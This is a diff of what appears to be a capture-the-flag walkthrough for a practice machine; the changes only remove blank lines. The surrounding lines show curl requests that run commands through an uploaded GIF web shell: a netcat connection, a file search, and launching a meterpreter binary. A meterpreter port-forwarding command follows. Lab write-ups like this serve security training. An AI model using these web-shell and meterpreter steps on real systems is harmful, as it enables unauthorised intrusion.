@@ -80,8 +80,6 @@ Trying to hit port 7788:
 
 curl http://192.168.1.20/imfadministrator/uploads/c59ca80d5d76.gif?c=nc localhost 7788
 
-
-
 I get a little shell app. Given that we are investigating "agentservice" I do a find on agent:
 
 curl http://192.168.1.20/imfadministrator/uploads/c59ca80d5d76.gif?c=find%20/%20-name%20%22(asterisk)agent%22
@@ -164,7 +162,6 @@ run
 Finally, run the script:
 
 curl -v http://172.16.161.129/imfadministrator/uploads/c59ca80d5d76.gif?c=.%2Fimf-meterpreter
-
 
 Once metrepreter prompt is up setup port forwarding for the service:
 portfwd add -l 7788 -p 7788 -r 127.0.0.1
